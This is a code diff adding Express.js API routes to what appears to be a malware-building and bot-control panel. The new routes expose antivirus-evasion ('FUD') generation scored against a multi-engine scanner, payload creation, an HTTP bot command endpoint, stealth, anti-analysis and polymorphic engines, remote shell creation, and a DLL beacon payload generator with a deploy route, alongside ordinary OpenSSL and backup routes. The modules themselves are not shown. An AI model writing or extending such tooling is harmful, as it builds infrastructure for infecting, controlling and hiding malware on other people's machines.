@@ -383,10 +383,17 @@ const realModules = {
     opensslManagement: {
         initialize: async () => await opensslManagement.initialize(),
         getStatus: async () => await opensslManagement.getStatus(),
+        getConfigSummary: async () => await opensslManagement.getConfigSummary(),
         getOpenSSLAlgorithms: async () => await opensslManagement.getOpenSSLAlgorithms(),
+        getAllAlgorithms: async () => await opensslManagement.getAllAlgorithms(),
+        getCustomAlgorithms: async () => await opensslManagement.getCustomAlgorithms(),
         toggleOpenSSLMode: async (enabled) => await opensslManagement.toggleOpenSSLMode(enabled),
         toggleCustomAlgorithms: async (enabled) => await opensslManagement.toggleCustomAlgorithms(enabled),
         applyPreset: async (presetName) => await opensslManagement.applyPreset(presetName),
+        testAlgorithm: async (algorithm, data) => await opensslManagement.testAlgorithm(algorithm, data),
+        getPerformance: async () => await opensslManagement.getPerformance(),
+        resetPerformance: async () => await opensslManagement.resetPerformance(),
+        generateReport: async () => await opensslManagement.generateReport(),
         getSettings: async () => await opensslManagement.getSettings(),
         getPanelConfig: async () => await opensslManagement.getPanelConfig(),
         getAvailableEndpoints: async () => await opensslManagement.getAvailableEndpoints(),
@@ -4129,6 +4136,736 @@ app.post('/api/advanced-fud/apply-fud', requireAuth, async (req, res) => {
         }
         const result = await realModules.advancedFUDEngine.applyBasicFUD(code, language, options);
         res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// FUD test endpoint
+app.post('/fud/test', requireAuth, async (req, res) => {
+    try {
+        const { target } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        // Test FUD by scanning the target file
+        const jottiScanner = require('./src/engines/jotti-scanner');
+        await jottiScanner.initialize();
+        const scanResult = await jottiScanner.scanFile(target);
+        
+        const fudScore = scanResult.summary ? scanResult.summary.fudScore : 0;
+        const detectionRate = scanResult.summary ? scanResult.summary.detectionRate : 100;
+        
+        res.json({ 
+            success: true, 
+            result: {
+                target: target,
+                fudScore: fudScore,
+                detectionRate: detectionRate,
+                status: fudScore >= 80 ? 'FUD' : fudScore >= 50 ? 'Low Detection' : 'Detected',
+                scanResult: scanResult
+            }
+        });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// FUD generate endpoint
+app.post('/fud/generate', requireAuth, async (req, res) => {
+    try {
+        const { target, level = 'basic' } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        const result = await realModules.advancedFUDEngine.applyBasicFUD(target, 'exe', { level });
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// File encryption/decryption endpoints
+app.post('/encrypt-file', requireAuth, async (req, res) => {
+    try {
+        const { filePath, algorithm = 'aes-256-gcm' } = req.body || {};
+        if (!filePath) {
+            return res.status(400).json({ error: 'filePath is required' });
+        }
+        
+        const result = await realModules.advancedCrypto.encryptFile(filePath, algorithm);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/decrypt-file', requireAuth, async (req, res) => {
+    try {
+        const { filePath, algorithm = 'aes-256-gcm' } = req.body || {};
+        if (!filePath) {
+            return res.status(400).json({ error: 'filePath is required' });
+        }
+        
+        const result = await realModules.advancedCrypto.decryptFile(filePath, algorithm);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// File analysis endpoint
+app.post('/file-analysis', requireAuth, async (req, res) => {
+    try {
+        const { filePath } = req.body || {};
+        if (!filePath) {
+            return res.status(400).json({ error: 'filePath is required' });
+        }
+        
+        const result = await realModules.fileOperations.analyzeFile(filePath);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Malware scan endpoint
+app.post('/api/security/malware-scan', requireAuth, async (req, res) => {
+    try {
+        const { filePath } = req.body || {};
+        if (!filePath) {
+            return res.status(400).json({ error: 'filePath is required' });
+        }
+        
+        const jottiScanner = require('./src/engines/jotti-scanner');
+        await jottiScanner.initialize();
+        const result = await jottiScanner.scanFile(filePath);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Payload Manager endpoints
+app.post('/payload-manager/create', requireAuth, async (req, res) => {
+    try {
+        const { type, options = {} } = req.body || {};
+        if (!type) {
+            return res.status(400).json({ error: 'type is required' });
+        }
+        
+        const result = await realModules.payloadManager.createPayload(type, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.get('/payload-manager/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.payloadManager.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// HTTP Bot endpoints
+app.post('/http-bot/connect', requireAuth, async (req, res) => {
+    try {
+        const { url, options = {} } = req.body || {};
+        if (!url) {
+            return res.status(400).json({ error: 'url is required' });
+        }
+        
+        const result = await realModules.networkTools.connect(url, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/http-bot/disconnect', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.networkTools.disconnect();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.get('/http-bot/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.networkTools.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/http-bot/command', requireAuth, async (req, res) => {
+    try {
+        const { command, options = {} } = req.body || {};
+        if (!command) {
+            return res.status(400).json({ error: 'command is required' });
+        }
+        
+        const result = await realModules.networkTools.executeCommand(command, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Anti-Analysis endpoints
+app.post('/anti-analysis/check', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        const result = await realModules.advancedAnalyticsEngine.analyze(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Stealth Engine endpoints
+app.post('/stealth/activate', requireAuth, async (req, res) => {
+    try {
+        const { options = {} } = req.body || {};
+        const result = await realModules.stealthEngine.activate(options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/stealth/deactivate', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.stealthEngine.deactivate();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Digital Forensics endpoints
+app.post('/forensics/analyze', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        const result = await realModules.advancedAnalyticsEngine.analyze(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/forensics/report', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        const result = await realModules.advancedAnalyticsEngine.generateReport(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Reverse Engineering endpoints
+app.post('/api/analysis/reverse-engineering', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        const result = await realModules.reverseEngineering.analyze(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/reverse/decompile', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        const result = await realModules.reverseEngineering.decompile(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Hot Patch endpoints
+app.post('/hot-patch', requireAuth, async (req, res) => {
+    try {
+        const { target, patch, options = {} } = req.body || {};
+        if (!target || !patch) {
+            return res.status(400).json({ error: 'target and patch are required' });
+        }
+        
+        const result = await realModules.advancedAnalyticsEngine.hotPatch(target, patch, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/hot-patch/rollback', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        const result = await realModules.advancedAnalyticsEngine.rollbackPatch(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Native Compiler endpoints
+app.post('/native/compile', requireAuth, async (req, res) => {
+    try {
+        const { source, options = {} } = req.body || {};
+        if (!source) {
+            return res.status(400).json({ error: 'source is required' });
+        }
+        
+        const result = await realModules.nativeCompiler.compile(source, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/native/optimize', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        const result = await realModules.nativeCompiler.optimize(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Red Killer endpoints
+app.post('/red-killer/execute', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        const result = await realModules.redKiller.execute(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.get('/red-killer/scan', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.redKiller.scan();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Red Shells endpoints
+app.post('/red-shells/create', requireAuth, async (req, res) => {
+    try {
+        const { type, options = {} } = req.body || {};
+        if (!type) {
+            return res.status(400).json({ error: 'type is required' });
+        }
+        
+        const result = await realModules.redShells.create(type, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.get('/red-shells/list', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.redShells.list();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Beaconism endpoints
+app.post('/beaconism/generate', requireAuth, async (req, res) => {
+    try {
+        const { type, options = {} } = req.body || {};
+        if (!type) {
+            return res.status(400).json({ error: 'type is required' });
+        }
+        
+        const result = await realModules.beaconismDLL.generatePayload(type, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/beaconism/deploy', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        const result = await realModules.beaconismDLL.deploy(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Mutex Engine endpoints
+app.post('/mutex/generate', requireAuth, async (req, res) => {
+    try {
+        const { options = {} } = req.body || {};
+        const result = await realModules.mutexEngine.generate(options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/mutex/test', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        const result = await realModules.mutexEngine.test(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Polymorphic Engine endpoints
+app.post('/polymorphic/transform', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        const result = await realModules.polymorphicEngine.transform(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/polymorphic/test', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        const result = await realModules.polymorphicEngine.test(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Compression Engine endpoints
+app.post('/compression/compress', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        const result = await realModules.compressionEngine.compress(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/compression/decompress', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        const result = await realModules.compressionEngine.decompress(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Mobile Tools endpoints
+app.post('/mobile/generate', requireAuth, async (req, res) => {
+    try {
+        const { type, options = {} } = req.body || {};
+        if (!type) {
+            return res.status(400).json({ error: 'type is required' });
+        }
+        
+        const result = await realModules.mobileTools.generate(type, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/mobile/test', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        const result = await realModules.mobileTools.test(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Backup System endpoints
+app.post('/backup/create', requireAuth, async (req, res) => {
+    try {
+        const { target, options = {} } = req.body || {};
+        if (!target) {
+            return res.status(400).json({ error: 'target is required' });
+        }
+        
+        const result = await realModules.backupSystem.create(target, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/backup/restore', requireAuth, async (req, res) => {
+    try {
+        const { backupId, options = {} } = req.body || {};
+        if (!backupId) {
+            return res.status(400).json({ error: 'backupId is required' });
+        }
+        
+        const result = await realModules.backupSystem.restore(backupId, options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.get('/backup/list', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.backupSystem.list();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// Implementation Checker endpoints
+app.post('/implementation-check/run', requireAuth, async (req, res) => {
+    try {
+        const { options = {} } = req.body || {};
+        const result = await realModules.implementationChecker.run(options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/implementation-check/force', requireAuth, async (req, res) => {
+    try {
+        const { options = {} } = req.body || {};
+        const result = await realModules.implementationChecker.force(options);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.get('/implementation-check/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.implementationChecker.getStatus();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// OpenSSL Management endpoints
+app.get('/openssl/config', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.opensslManagement.getConfigSummary();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/openssl/toggle-openssl', requireAuth, async (req, res) => {
+    try {
+        const { enabled } = req.body || {};
+        if (typeof enabled !== 'boolean') {
+            return res.status(400).json({ error: 'enabled must be a boolean' });
+        }
+        
+        const result = await realModules.opensslManagement.toggleOpenSSLMode(enabled);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/openssl/toggle-custom', requireAuth, async (req, res) => {
+    try {
+        const { enabled } = req.body || {};
+        if (typeof enabled !== 'boolean') {
+            return res.status(400).json({ error: 'enabled must be a boolean' });
+        }
+        
+        const result = await realModules.opensslManagement.toggleCustomAlgorithms(enabled);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.get('/openssl/algorithms', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.opensslManagement.getAllAlgorithms();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.get('/openssl/openssl-algorithms', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.opensslManagement.getOpenSSLAlgorithms();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.get('/openssl/custom-algorithms', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.opensslManagement.getCustomAlgorithms();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+// OpenSSL Management comprehensive endpoints
+app.get('/openssl-management/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.opensslManagement.getStatus();
+        res.json({ success: true, status: result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/openssl-management/toggle', requireAuth, async (req, res) => {
+    try {
+        const { enabled } = req.body || {};
+        if (typeof enabled !== 'boolean') {
+            return res.status(400).json({ error: 'enabled must be a boolean' });
+        }
+        
+        const result = await realModules.opensslManagement.toggleOpenSSLMode(enabled);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/openssl-management/preset', requireAuth, async (req, res) => {
+    try {
+        const { preset } = req.body || {};
+        if (!preset) {
+            return res.status(400).json({ error: 'preset is required' });
+        }
+        
+        const result = await realModules.opensslManagement.applyPreset(preset);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/openssl-management/test', requireAuth, async (req, res) => {
+    try {
+        const { algorithm, data } = req.body || {};
+        if (!algorithm || !data) {
+            return res.status(400).json({ error: 'algorithm and data are required' });
+        }
+        
+        const result = await realModules.opensslManagement.testAlgorithm(algorithm, data);
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.get('/openssl-management/performance', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.opensslManagement.getPerformance();
+        res.json({ success: true, performance: result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.post('/openssl-management/reset-performance', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.opensslManagement.resetPerformance();
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
+    }
+});
+
+app.get('/openssl-management/report', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.opensslManagement.generateReport();
+        res.json({ success: true, report: result });
     } catch (e) {
         res.status(500).json({ error: e.message });
     }
